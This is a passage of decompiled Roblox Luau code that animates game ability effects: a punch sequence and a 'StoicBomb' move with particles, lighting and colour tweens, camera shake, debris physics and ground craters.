                                                        Maid = u1545._maid,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -3),
                                                    })

                                                    v1623:ScaleTo(3)
                                                    u1554({
                                                        FX = v1623,
                                                        On = true,
                                                    })

                                                    local v1624, v1625, v1626 = pairs(v1623:GetDescendants())

                                                    while true do
                                                        local v1627

                                                        v1626, v1627 = v1624(v1625, v1626)

                                                        if v1626 == nil then
                                                            break
                                                        end
                                                        if v1627:IsA('ParticleEmitter') then
                                                            v1627.Rate = v1627.Rate * 5
                                                        end
                                                    end

                                                    game.Debris:AddItem(v1623, 0.15)

                                                    local u1628 = u1553({
                                                        FX = _PunchFX.EnabledPunch,
                                                        Maid = u1545._maid,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -60),
                                                    })
                                                    local v1629 = u1628

                                                    u1628.ScaleTo(v1629, 4)
                                                    u1554({
                                                        FX = u1628,
                                                        On = true,
                                                    })
                                                    task.delay(0.25, function()
                                                        u1554({
                                                            FX = u1628,
                                                            On = false,
                                                        })
                                                    end)

                                                    local v1630 = _PunchFX.Flash:Clone()

                                                    v1630:ScaleTo(4)
                                                    u1555({
                                                        Model = v1630,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, 40) * CFrame.Angles(0, 0, 0),
                                                        Info = TweenInfo.new(0.5, Enum.EasingStyle.Exponential),
                                                    })
                                                    u1578(v1630, 0.5)
                                                    game.Debris:AddItem(v1630, 0.15)
                                                end)()
                                                u1551(0.15)
                                                v1622()
                                            end)()
                                        end)

                                        local v1631 = game.ReplicatedStorage.Resources.UFW.RB:Clone()

                                        v1631:SetPrimaryPartCFrame(_PrimaryPart4.CFrame * CFrame.new(0, 0, -4))

                                        v1631.Parent = _Thrown2

                                        v1631:ScaleTo(7)

                                        local v1632 = v1631.AnimationController:LoadAnimation(_UFW2.lastthing)

                                        v1632:Play()

                                        v1632.TimePosition = 1.4

                                        game.Debris:AddItem(v1631, 3)

                                        local u1633 = v1631

                                        task.delay(1, function()
                                            local v1634 = u1633
                                            local v1635, v1636, v1637 = pairs(v1634:GetChildren())

                                            while true do
                                                local v1638

                                                v1637, v1638 = v1635(v1636, v1637)

                                                if v1637 == nil then
                                                    break
                                                end
                                                if v1638:IsA('BasePart') then
                                                    u10:Create(v1638, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Transparency = 1}):Play()
                                                end
                                            end
                                        end)
                                        task.delay(1, function()
                                            local v1639, v1640, v1641 = pairs(u1471)

                                            while true do
                                                local v1642

                                                v1641, v1642 = v1639(v1640, v1641)

                                                if v1641 == nil then
                                                    break
                                                end
                                                if typeof(v1642) ~= 'RBXScriptConnection' then
                                                    v1642:Destroy()
                                                else
                                                    v1642:Disconnect()
                                                end
                                            end

                                            task.wait(0.4)
                                            shared.SetCore(true)
                                        end)
                                        u357({
                                            Intensity = 40,
                                            Last = 5,
                                        })
                                    end)

                                    local _spawn6 = task.spawn
                                    local u1644 = false

                                    _spawn6(function()
                                        if u1644 then
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 0,
                                                Ambient = Color3.fromRGB(0, 0, 0),
                                                OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                        else
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 2,
                                                Ambient = Color3.fromRGB(138, 138, 138),
                                                OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                        end
                                    end)

                                    local v1645, v1646, v1647 = pairs(u1471)

                                    while true do
                                        local v1648

                                        v1647, v1648 = v1645(v1646, v1647)

                                        if v1647 == nil then
                                            break
                                        end
                                        if typeof(v1648) ~= 'RBXScriptConnection' then
                                            v1648:Destroy()
                                        else
                                            v1648:Disconnect()
                                        end
                                    end

                                    game.Workspace.CurrentCamera.CFrame = u1474.CFrame * CFrame.new(0, 3, 15)
                                    game.Workspace.CurrentCamera.FieldOfView = 70
                                end,
                                [23.035] = function()
                                    _Folder3:Destroy()

                                    local _ = workspace.CurrentCamera.CFrame

                                    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                                    workspace.CurrentCamera.FieldOfView = 70
                                end,
                            }
                            local v1650, v1651, v1652 = pairs(v1649)

                            while true do
                                local v1653

                                v1652, v1653 = v1650(v1651, v1652)

                                if v1652 == nil then
                                    break
                                end

                                task.delay(v1652, v1653)
                            end
                        end
                        local function u2286()
                            u134()
                            u143()
                            u251()
                            _LocalPlayer3.Character:WaitForChild('Humanoid'):WaitForChild('Animator')
                            u706(u1077.StoicBomb, true)
                            task.delay(1, function()
                                local _Sound9 = Instance.new('Sound')

                                _Sound9.Volume = 7
                                _Sound9.Parent = _LocalPlayer3.Character.Torso
                                _Sound9.SoundId = 'rbxassetid://17141392676'

                                _Sound9:Play()
                            end)
                            task.delay(3.25, function()
                                shared.sfx({
                                    SoundId = 'rbxassetid://17141392854',
                                    CFrame = u113().CFrame,
                                    Volume = 10,
                                    RollOffMaxDistance = 400,
                                    RollOffMode = Enum.RollOffMode.LinearSquare,
                                })
                            end)
                            task.delay(0.8, function()
                                local _Sound10 = Instance.new('Sound')

                                _Sound10.Volume = 5
                                _Sound10.Parent = _LocalPlayer3.Character.Torso
                                _Sound10.SoundId = 'rbxassetid://17141392976'

                                _Sound10:Play()
                            end)
                            task.delay(0.35, function()
                                local _Sound11 = Instance.new('Sound')

                                _Sound11.Volume = 3
                                _Sound11.Parent = _LocalPlayer3.Character.Torso
                                _Sound11.SoundId = 'rbxassetid://17149593018'

                                _Sound11:Play()

                                local _Sound12 = Instance.new('Sound')

                                _Sound12.Volume = 3
                                _Sound12.Parent = _LocalPlayer3.Character.Torso
                                _Sound12.SoundId = 'rbxassetid://17141392513'

                                _Sound12:Play()
                            end)

                            local v1659 = math.random(1, 99999)
                            local u1660 = {
                                char = _LocalPlayer3.Character,
                                humanoid = _LocalPlayer3.Character.Humanoid,
                                Seed = v1659,
                            }
                            local _char = u1660.char
                            local _PrimaryPart5 = _char.PrimaryPart
                            local _ = script
                            local u1663, u1664 = u745(game.ReplicatedStorage.Resources.StoicBomb, {})

                            if u1660.humanoid or u238.Character ~= _char then
                                local u1665 = {}
                                local u1666 = nil
                                local u2275 = {
                                    [1] = function()
                                        u1664.StoicBombSpeedLines = u1664._maid:give(u1663.stoicbombspeedlines:Clone())

                                        local _Weld2 = Instance.new('Weld')

                                        _Weld2.Part0 = u1664.StoicBombSpeedLines
                                        _Weld2.Part1 = _char.Torso
                                        _Weld2.Parent = u1664.StoicBombSpeedLines
                                        u1664.Ranges = {}

                                        local v1668, v1669, v1670 = pairs(u1664.StoicBombSpeedLines:GetDescendants())

                                        while true do
                                            local v1671

                                            v1670, v1671 = v1668(v1669, v1670)

                                            if v1670 == nil then
                                                break
                                            end
                                            if v1671:IsA('PointLight') then
                                                u1664.Ranges[v1671] = v1671.Range
                                                v1671.Range = 0
                                            end
                                        end

                                        u1664.StoicBombSpeedLines.Parent = workspace.Thrown
                                    end,
                                    [42] = function()
                                        u1664.StoicBombSpeedLines.speedylines.Enabled = true
                                        u1664.StoicBombSpeedLines.speedylinesfire.Enabled = true
                                    end,
                                    [48] = function()
                                        u1664.StoicBombSpeedLines.Attachment['STAR!!!'].Enabled = true
                                    end,
                                    [83] = function()
                                        local v1672, v1673, v1674 = pairs(u1664.StoicBombSpeedLines:GetDescendants())

                                        while true do
                                            local v1675

                                            v1674, v1675 = v1672(v1673, v1674)

                                            if v1674 == nil then
                                                break
                                            end
                                            if v1675:IsA('ParticleEmitter') and v1675.Name ~= 'aaaaaaa' then
                                                v1675.Enabled = false
                                            end
                                        end
                                    end,
                                    [86] = function()
                                        local v1676, v1677, v1678 = pairs(u1664.Ranges)

                                        while true do
                                            local v1679

                                            v1678, v1679 = v1676(v1677, v1678)

                                            if v1678 == nil then
                                                break
                                            end

                                            u10:Create(v1678, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {Range = v1679}):Play()
                                        end
                                    end,
                                    [66] = function()
                                        u1664.stoiccarrive = u1664._maid:give(u1663.stoicarrive:Clone())

                                        local _Weld3 = Instance.new('Weld')

                                        _Weld3.Part0 = u1664.stoiccarrive
                                        _Weld3.Part1 = _char.Torso
                                        _Weld3.Parent = u1664.stoiccarrive
                                        _Weld3.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, -1.5707963267948966)
                                        u1664.stoiccarrive.Decal.Transparency = 0.298
                                        u1664.stoiccarrive.Mesh.Scale = Vector3.new(0.8510000109672546, 0.2980000078678131, 0.2980000078678131, 0)
                                        u1664.stoiccarrive.Parent = workspace.Thrown

                                        u10:Create(u1664.stoiccarrive.Mesh, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {
                                            Scale = Vector3.new(0.5189999938011169, 0.9629999995231628, 0.9629999995231628, 0),
                                        }):Play()
                                        u10:Create(u1664.stoiccarrive.Decal, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {Transparency = 1}):Play()
                                    end,
                                    [84] = function()
                                        u1664.stoiccarrive2 = u1664._maid:give(u1663.stoicarrive:Clone())

                                        local _Weld4 = Instance.new('Weld')

                                        _Weld4.Part0 = u1664.stoiccarrive2
                                        _Weld4.Part1 = _char.Torso
                                        _Weld4.Parent = u1664.stoiccarrive2
                                        _Weld4.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, -1.5707963267948966)
                                        u1664.stoiccarrive2.Decal.Transparency = 0.086
                                        u1664.stoiccarrive2.Mesh.Scale = Vector3.new(1.9140000343322754, 0.12800000607967377, 0.12800000607967377, 0)
                                        u1664.stoiccarrive2.Parent = workspace.Thrown

                                        u10:Create(u1664.stoiccarrive2.Mesh, TweenInfo.new(0.25, Enum.EasingStyle.Sine), {
                                            Scale = Vector3.new(1.034000039100647, 1.4490000009536743, 1.4490000009536743, 0),
                                        }):Play()
                                        u10:Create(u1664.stoiccarrive2.Weld, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
                                            C0 = u1664.stoiccarrive2.Weld.C0 * CFrame.Angles(0, 0.7853981633974483, 0),
                                        }):Play()
                                        u10:Create(u1664.stoiccarrive2.Decal, TweenInfo.new(0.25, Enum.EasingStyle.Linear), {Transparency = 1}):Play()

                                        u1664.OHNO = u1664._maid:give(u1663.OHNO:Clone())

                                        u1664.OHNO:ScaleTo(0.05)

                                        local _Weld5 = Instance.new('Weld')

                                        _Weld5.Part0 = u1664.OHNO.PrimaryPart
                                        _Weld5.Part1 = _char.Torso
                                        _Weld5.Parent = u1664.OHNO
                                        _Weld5.C0 = CFrame.new(0, 3, 0)
                                        u1664.OHNO.Parent = workspace.Thrown
                                        u1664.OHNOScale = u1664._maid:give(Instance.new('NumberValue'))

                                        u1664._maid:give(u1664.OHNOScale.Changed:Connect(function()
                                            u1664.OHNO:ScaleTo(u1664.OHNOScale.Value)
                                        end))

                                        u1664.OHNOScale.Value = u1664.OHNO:GetScale()
                                    end,
                                    [78] = function()
                                        u1664.CC = u1664._maid:give(Instance.new('ColorCorrectionEffect'))

                                        local _, v1683 = workspace:FindFirstChildOfClass('Camera'):WorldToScreenPoint(_PrimaryPart5.Position)

                                        if v1683 or u238.Character.PrimaryPart == _PrimaryPart5 then
                                            u1664.CC.Parent = game.Lighting
                                        end

                                        u10:Create(u1664.CC, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
                                            Brightness = -0.998,
                                            Contrast = 3.991,
                                            Saturation = -0.299,
                                        }):Play()
                                        u6:AddItem(u1664.CC, 4)
                                    end,
                                    [154] = function()
                                        u10:Create(u1664.CC, TweenInfo.new(0.85, Enum.EasingStyle.Quad), {
                                            Brightness = 1,
                                            Contrast = 0.515,
                                            Saturation = -0.039,
                                        }):Play()
                                    end,
                                    [124] = function()
                                        u1664.Heat = u1664._maid:give(u1663.HEAT:Clone())

                                        u1664.Heat:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 0.5, 0))

                                        u1664.Heat.Parent = workspace.Thrown

                                        u1664.Heat:ScaleTo(1)

                                        u1664.HeatScale = u1664._maid:give(Instance.new('NumberValue'))

                                        u1664._maid:giveTask(u1664.HeatScale.Changed:Connect(function()
                                            u1664.Heat:ScaleTo(u1664.HeatScale.Value)
                                        end))
                                        u10:Create(u1664.OHNOScale, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Value = 0.15}):Play()
                                        u246({
                                            FX = u1664.Heat,
                                            Scale = 0.6,
                                        })
                                        u10:Create(u1664.HeatScale, TweenInfo.new(1, Enum.EasingStyle.Sine), {Value = 4}):Play()
                                    end,
                                    [196] = function()
                                        u424({
                                            FX = u1664.OHNO,
                                            On = false,
                                        })
                                        u10:Create(u1664.CC, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {
                                            Brightness = 0,
                                            Contrast = 0,
                                            Saturation = 0,
                                        }):Play()

                                        u1664.CC.Brightness = 0
                                        u1664.CC.Contrast = 0
                                        u1664.CC.Saturation = 0

                                        task.wait(0.1)
                                        u424({
                                            FX = u1664.OHNO,
                                            On = false,
                                        })

                                        u1664.Pre = u1664._maid:give(u1663.pre:Clone())

                                        u1664.Pre:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 2, 0))
                                        u1664.Pre:ScaleTo(2)
                                        u246({
                                            FX = u1664.Pre,
                                            Scale = 1.2,
                                        })
                                        u413({
                                            FX = u1664.Pre,
                                            Count = 5,
                                        })

                                        u1664.Pre.Parent = workspace.Thrown

                                        u439(u1664.Pre)
                                    end,
                                    [205] = function()
                                        u1664.Stage1 = u1664._maid:give(u1663.Stage1:Clone())

                                        u1664.Stage1:SetPrimaryPartCFrame(_PrimaryPart5.CFrame * CFrame.new(0, -_PrimaryPart5.Size.Y * 1.5, 0))

                                        u1664.Stage1.Parent = workspace.Thrown
                                        u1664.Stage1Size = Instance.new('NumberValue')

                                        u1664.Stage1Size.Changed:Connect(function()
                                            u1664.Stage1:ScaleTo(u1664.Stage1Size.Value)
                                        end)

                                        u1664.Stage1Size.Value = 0.3
                                        u1664.Stage1Size.Parent = u1664.Stage1

                                        spawn(function()
                                            for _ = 1, 100 do
                                                if u1664.Stage1.Parent == nil then
                                                    break
                                                end

                                                u1664.Stage1.Wind:SetPrimaryPartCFrame(u1664.Stage1.Wind.PrimaryPart.CFrame * CFrame.Angles(0, 0.6108652381980153, 0))
                                                task.wait(0.01)
                                            end
                                        end)
                                        u246({
                                            FX = u1664.Stage1,
                                            Scale = 0.5,
                                        })
                                        u399(u1664.Stage1Size, {
                                            Time = 0.1,
                                            EasingStyle = 'Bounce',
                                            Goal = {Value = 1.5},
                                        })
                                        task.wait(0.05)
                                        u10:Create(u1664.Stage1Size, TweenInfo.new(2.55, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out, 3, false), {Value = 16}):Play()
                                        task.wait(0.15)

                                        local v1684, v1685, v1686 = pairs(u1664.Stage1:GetDescendants())

                                        while true do
                                            local v1687

                                            v1686, v1687 = v1684(v1685, v1686)

                                            if v1686 == nil then
                                                break
                                            end
                                            if v1687:IsA('ParticleEmitter') then
                                                v1687.Enabled = false
                                            end
                                        end

                                        task.wait(0.1)

                                        local v1688, v1689, v1690 = pairs(u1664.Stage1:GetDescendants())

                                        while true do
                                            local v1691

                                            v1690, v1691 = v1688(v1689, v1690)

                                            if v1690 == nil then
                                                break
                                            end
                                            if v1691:IsA('Decal') or v1691:IsA('BasePart') then
                                                u10:Create(v1691, TweenInfo.new(0.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                            end
                                        end
                                    end,
                                    [211] = function()
                                        if u238.Character == u1660.char or (u238.Character.PrimaryPart.Position - _PrimaryPart5.Position).magnitude <= 200 then
                                            u357({
                                                Effect = 'Camshake',
                                                Intensity = 20,
                                                Last = 1,
                                            })
                                        end

                                        local v1692, u1693 = u371({
                                            orig = _PrimaryPart5.Position,
                                            dir = Vector3.new(0, -50, 0, 0),
                                        })
                                        local u1694 = {
                                            Position = u1693 + Vector3.new(0, 0.10000000149011612, 0, 0),
                                            Hit = v1692,
                                        }

                                        task.spawn(function()
                                            local _Hit = u1694.Hit

                                            if _Hit then
                                                local v1696 = _LegacyReplication.Wind:Clone()

                                                v1696.Parent = workspace.Thrown
                                                v1696.Position = u1694.Position - Vector3.new(0, 25, 0, 0)
                                                v1696.UpSmoke.Color = ColorSequence.new(_Hit.Color)

                                                v1696.UpSmoke:Emit(25)
                                                game:service('Debris'):AddItem(v1696, 6)
                                            end

                                            local _Position3 = _PrimaryPart5.Position
                                            local _, v1698 = workspace:FindFirstChildOfClass('Camera'):WorldToScreenPoint(_Position3)
                                            local u1699 = {}
                                            local u1700 = {}

                                            for v1701 = 1, v1698 and 85 or 30 do
                                                local _ = v1701 / 8
                                                local _CFrame10 = _PrimaryPart5.CFrame
                                                local _new3 = CFrame.new
                                                local v1704 = -3 * v1701 - v1701 * 2
                                                local v1705 = 3 * v1701 + v1701 * 2
                                                local v1706 = u86

                                                if not v1705 and v1704 then
                                                    v1705 = v1704
                                                    v1704 = 1
                                                end
                                                if not (v1705 or v1704) then
                                                    v1704 = 0
                                                    v1705 = 1
                                                end

                                                local _p = (_CFrame10 * _new3(v1706:NextNumber(v1704, v1705), 0, u405(-1 * v1701, 1 * v1701)) + _PrimaryPart5.CFrame.lookVector * (v1701 * 5)).p
                                                local _, _ = workspace:FindFirstChildOfClass('Camera'):WorldToScreenPoint(_p)

                                                if _Hit then
                                                    (function(p1708)
                                                        local _Part7 = Instance.new('Part')

                                                        _Part7.Name = 'DebrisggbbTf'
                                                        _Part7.Anchored = false
                                                        _Part7.CanCollide = false
                                                        _Part7.Transparency = 0
                                                        _Part7.Massless = false
                                                        u1700[_Part7] = true

                                                        local v1710 = 3
                                                        local v1711 = -2
                                                        local v1712 = 3
                                                        local v1713 = u86
                                                        local v1714

                                                        if v1712 or not v1711 then
                                                            v1714 = v1711
                                                            v1711 = v1712
                                                        else
                                                            v1714 = 1
                                                        end
                                                        if not (v1711 or v1714) then
                                                            v1714 = 0
                                                            v1711 = 1
                                                        end

                                                        local v1715 = v1710 + v1713:NextNumber(v1714, v1711)
                                                        local v1716 = 3
                                                        local v1717 = -2
                                                        local v1718 = 3
                                                        local v1719 = u86
                                                        local v1720

                                                        if v1718 or not v1717 then
                                                            v1720 = v1717
                                                            v1717 = v1718
                                                        else
                                                            v1720 = 1
                                                        end
                                                        if not (v1717 or v1720) then
                                                            v1720 = 0
                                                            v1717 = 1
                                                        end

                                                        local v1721 = v1716 + v1719:NextNumber(v1720, v1717)
                                                        local v1722 = 3
                                                        local v1723 = -4
                                                        local v1724 = 5
                                                        local v1725 = u86
                                                        local v1726

                                                        if v1724 or not v1723 then
                                                            v1726 = v1723
                                                            v1723 = v1724
                                                        else
                                                            v1726 = 1
                                                        end
                                                        if not (v1723 or v1726) then
                                                            v1726 = 0
                                                            v1723 = 1
                                                        end

                                                        _Part7.Size = Vector3.new(v1715, v1721, v1722 + v1725:NextNumber(v1726, v1723)) * 2.5

                                                        if p1708 then
                                                            local _Size2 = _Part7.Size
                                                            local v1728 = 1
                                                            local v1729 = 2
                                                            local v1730 = u86
                                                            local v1731

                                                            if v1729 or not v1728 then
                                                                v1731 = v1728
                                                                v1728 = v1729
                                                            else
                                                                v1731 = 1
                                                            end
                                                            if not (v1728 or v1731) then
                                                                v1731 = 0
                                                                v1728 = 1
                                                            end

                                                            _Part7.Size = _Size2 * v1730:NextNumber(v1731, v1728)
                                                        end

                                                        local _new4 = CFrame.new
                                                        local v1733 = u1693
                                                        local v1734 = -70
                                                        local v1735 = 70
                                                        local v1736 = u86
                                                        local v1737

                                                        if v1735 or not v1734 then
                                                            v1737 = v1734
                                                            v1734 = v1735
                                                        else
                                                            v1737 = 1
                                                        end
                                                        if not (v1734 or v1737) then
                                                            v1737 = 0
                                                            v1734 = 1
                                                        end

                                                        local v1738 = _new4(v1733 + Vector3.new(v1736:NextNumber(v1737, v1734), 0, u405(-70, 70)))
                                                        local _Angles6 = CFrame.Angles
                                                        local v1740 = -360
                                                        local v1741 = 360
                                                        local v1742 = u86
                                                        local v1743

                                                        if v1741 or not v1740 then
                                                            v1743 = v1740
                                                            v1740 = v1741
                                                        else
                                                            v1743 = 1
                                                        end
                                                        if not (v1740 or v1743) then
                                                            v1743 = 0
                                                            v1740 = 1
                                                        end

                                                        local v1744 = math.rad((v1742:NextNumber(v1743, v1740)))
                                                        local v1745 = -360
                                                        local v1746 = 360
                                                        local v1747 = u86
                                                        local v1748

                                                        if v1746 or not v1745 then
                                                            v1748 = v1745
                                                            v1745 = v1746
                                                        else
                                                            v1748 = 1
                                                        end
                                                        if not (v1745 or v1748) then
                                                            v1748 = 0
                                                            v1745 = 1
                                                        end

                                                        local v1749 = math.rad((v1747:NextNumber(v1748, v1745)))
                                                        local v1750 = -360
                                                        local v1751 = 360
                                                        local v1752 = u86
                                                        local v1753

                                                        if v1751 or not v1750 then
                                                            v1753 = v1750
                                                            v1750 = v1751
                                                        else
                                                            v1753 = 1
                                                        end
                                                        if not (v1750 or v1753) then
                                                            v1753 = 0
                                                            v1750 = 1
                                                        end

                                                        _Part7.CFrame = v1738 * _Angles6(v1744, v1749, (math.rad((v1752:NextNumber(v1753, v1750)))))
                                                        _Part7.Material = _Hit.Material
                                                        _Part7.Color = _Hit.Color
                                                        _Part7.Parent = workspace.Thrown

                                                        if (_Part7.Position - _PrimaryPart5.Position).magnitude <= 50 then
                                                            local _Size3 = _Part7.Size
                                                            local v1755 = 0.4
                                                            local v1756 = 0.7
                                                            local v1757 = u86
                                                            local v1758

                                                            if v1756 or not v1755 then
                                                                v1758 = v1755
                                                                v1755 = v1756
                                                            else
                                                                v1758 = 1
                                                            end
                                                            if not (v1755 or v1758) then
                                                                v1758 = 0
                                                                v1755 = 1
                                                            end

                                                            _Part7.Size = _Size3 * v1757:NextNumber(v1758, v1755)
                                                        end

                                                        table.insert(u1699, _Part7)

                                                        local _BodyVelocity6 = Instance.new('BodyVelocity')

                                                        _BodyVelocity6.MaxForce = Vector3.new(1, 1, 1, 0) * 36000000

                                                        local _new5 = CFrame.new
                                                        local _Position4 = _Part7.Position
                                                        local v1762 = 0
                                                        local v1763 = 1
                                                        local v1764 = 50
                                                        local v1765 = u86
                                                        local v1766

                                                        if v1764 or not v1763 then
                                                            v1766 = v1763
                                                            v1763 = v1764
                                                        else
                                                            v1766 = 1
                                                        end
                                                        if not (v1763 or v1766) then
                                                            v1766 = 0
                                                            v1763 = 1
                                                        end

                                                        local _lookVector2 = _new5(_Position4 + Vector3.new(v1762, v1765:NextNumber(v1766, v1763), 0), u1693).lookVector
                                                        local v1768 = 50
                                                        local v1769 = 100
                                                        local v1770 = u86
                                                        local v1771

                                                        if v1769 or not v1768 then
                                                            v1771 = v1768
                                                            v1768 = v1769
                                                        else
                                                            v1771 = 1
                                                        end
                                                        if not (v1768 or v1771) then
                                                            v1771 = 0
                                                            v1768 = 1
                                                        end

                                                        _BodyVelocity6.Velocity = _lookVector2 * -(v1770:NextNumber(v1771, v1768) * 3)
                                                        _BodyVelocity6.Parent = _Part7

                                                        game:service('Debris'):AddItem(_BodyVelocity6, 0.15)

                                                        local _Attachment2 = Instance.new('Attachment')

                                                        _Attachment2.Parent = _Part7

                                                        local _Attachment3 = Instance.new('Attachment')

                                                        _Attachment3.Position = Vector3.new(0, -0.10000000149011612, 0, 0)
                                                        _Attachment3.Parent = _Part7

                                                        local v1774 = _LegacyReplication.TrailTwo:Clone()

                                                        v1774.Parent = _Part7
                                                        v1774.Attachment0 = _Attachment2
                                                        v1774.Attachment1 = _Attachment3

                                                        shared.addshake(u405(1, 2))

                                                        return _Part7
                                                    end)()
                                                end
                                                if v1701 % 5 == 0 then
                                                    task.wait()
                                                end
                                            end

                                            task.delay(8, function()
                                                local v1775, v1776, v1777 = pairs(u1699)

                                                while true do
                                                    local v1778

                                                    v1777, v1778 = v1775(v1776, v1777)

                                                    if v1777 == nil then
                                                        break
                                                    end

                                                    v1778:Destroy()
                                                end
                                            end)

                                            for v1779 = 1, 5 do
                                                u724({
                                                    Effect = 'Ground Crater',
                                                    Seed = u1660.Seed + v1779,
                                                    start = u1693 + Vector3.new(0, 0.10000000149011612, 0, 0),
                                                    ['end'] = Vector3.new(0, -14, 0, 0),
                                                    amount = 6 + v1779 / 2,
                                                    nosound = true,
                                                    nosmoke = v1779 > 2,
                                                    stronger = v1779 <= 2 and {minus = 0} or false,
                                                    sizemult = 1.45 * v1779,
                                                    size = 3.5 * v1779,
                                                })
                                            end
                                        end)

                                        u1664.Impact = u1664._maid:give(u1663.Impact:Clone())
                                        u1666 = u1664.Impact

                                        u1664.Impact:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 2, 0))

                                        u1664.Impact.Parent = workspace.Thrown

                                        u1664.Impact:ScaleTo(6.300000000000001)
                                        u246({
                                            FX = u1664.Impact,
                                            Scale = 0.3,
                                        })
                                        u698(u1664.Impact)
                                        u413({
                                            FX = u1664.Impact,
                                            Count = 5.5,
                                        })
                                        u10:Create(u1664.OHNOScale, TweenInfo.new(0.2, Enum.EasingStyle.Sine), {Value = 0.01}):Play()
                                        u10:Create(u1664.HeatScale, TweenInfo.new(0.2, Enum.EasingStyle.Sine), {Value = 9}):Play()
                                        u424({
                                            FX = u1664.Heat,
                                            On = false,
                                        })

                                        u1664.Heat2 = u1663.HEAT:Clone()

                                        u1664.Heat2:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 0.5, 0))
                                        u1664.Heat2:ScaleTo(16.8)
                                        u424({
                                            FX = u1664.Heat2,
                                            On = false,
                                        })
                                        u246({
                                            FX = u1664.Heat2,
                                            Scale = 0.36,
                                        })

                                        u1664.Heat2.Parent = workspace.Thrown

                                        u698(u1664.Heat2)

                                        u1664.Lines = u1664._maid:give(u1663.Lines:Clone())

                                        u1664.Lines:SetPrimaryPartCFrame(_PrimaryPart5.CFrame * CFrame.new(0, -_PrimaryPart5.Size.Y * 3, 0))

                                        u1664.Lines.Parent = workspace.Thrown

                                        u1664.Lines:ScaleTo(6.300000000000001)
                                        u413({
                                            FX = u1664.Lines,
                                            Count = 5,
                                        })
                                        u246({
                                            FX = u1664.Lines,
                                            Scale = 0.5,
                                        })

                                        for _ = 1, 3 do
                                            local v1780 = u1663.SIRR2:Clone()

                                            v1780:SetPrimaryPartCFrame(u1664.StoicBoomEntrance.CFrame * CFrame.new(0, 5, 0) * CFrame.Angles(3.141592653589793, 0, 0))
                                            v1780:ScaleTo(5.670000000000001)

                                            local u1781 = {
                                                Model = v1780,
                                                Info = TweenInfo.new(0.1, Enum.EasingStyle.Sine),
                                                T = 0,
                                                EndT = 0,
                                            }

                                            task.spawn(function()
                                                local _Model2 = u1781.Model
                                                local u1783 = u1781.Info or TweenInfo.new(1, Enum.EasingStyle.Sine)
                                                local _Start = _Model2:FindFirstChild('Start')
                                                local _End = _Model2:FindFirstChild('End')
                                                local _Stay = u1781.Stay
                                                local _Anchor2 = u1781.Anchor
                                                local u1788 = u1781.EndT or 1
                                                local _Del = u1781.Del
                                                local _Skip = u1781.Skip

                                                if _Start and _End then
                                                    _Model2.PrimaryPart = _Start

                                                    if not _Skip then
                                                        local v1791, v1792, v1793 = pairs(_Model2:GetChildren())

                                                        while true do
                                                            local v1794, v1795 = v1791(v1792, v1793)

                                                            if v1794 == nil then
                                                                break
                                                            end

                                                            v1793 = v1794

                                                            if v1795:IsA('BasePart') then
                                                                v1795.CanCollide = false
                                                                v1795.Anchored = true
                                                            end
                                                        end
                                                    end
                                                    if _Anchor2 then
                                                        _Model2:SetPrimaryPartCFrame(_Anchor2)
                                                    end
                                                    if u1781.T then
                                                        _Start.Transparency = u1781.T
                                                    end

                                                    _End.Transparency = 1
                                                    _Model2.Parent = workspace.Thrown

                                                    local _Decal4 = _Start:FindFirstChildOfClass('Decal')
                                                    local _SpecialMesh4 = _Start:FindFirstChildOfClass('SpecialMesh')
                                                    local _SpecialMesh5 = _End:FindFirstChildOfClass('SpecialMesh')
                                                    local _Decal5 = _End:FindFirstChildOfClass('Decal')

                                                    if _Decal5 and not _Skip then
                                                        _Decal5.Transparency = 1
                                                    end

                                                    local u1800 = u10

                                                    if _Del then
                                                        u10:Create(_Start, u1783, {
                                                            Size = _End.Size,
                                                            CFrame = _End.CFrame,
                                                        }):Play()
                                                        task.delay(_Del, function()
                                                            u1800:Create(_Start, u1783, {Transparency = u1788})
                                                            u1800:Play()

                                                            if _Decal4 then
                                                                local v1801 = _Start
                                                                local v1802, v1803, v1804 = pairs(v1801:GetChildren())

                                                                while true do
                                                                    local v1805

                                                                    v1804, v1805 = v1802(v1803, v1804)

                                                                    if v1804 == nil then
                                                                        break
                                                                    end
                                                                    if v1805:IsA('Decal') then
                                                                        u10:Create(v1805, u1783, {Transparency = u1788}):Play()
                                                                    end
                                                                end
                                                            end
                                                            if _SpecialMesh4 then
                                                                u1800:Create(_SpecialMesh4, u1783, {
                                                                    Scale = _SpecialMesh5.Scale,
                                                                }):Play()
                                                            end
                                                        end)
                                                    else
                                                        if _SpecialMesh4 then
                                                            u10:Create(_SpecialMesh4, u1783, {
                                                                Scale = _SpecialMesh5.Scale,
                                                            }):Play()
                                                        end
                                                        if _Decal4 then
                                                            local v1806, v1807, v1808 = pairs(_Start:GetChildren())

                                                            while true do
                                                                local v1809

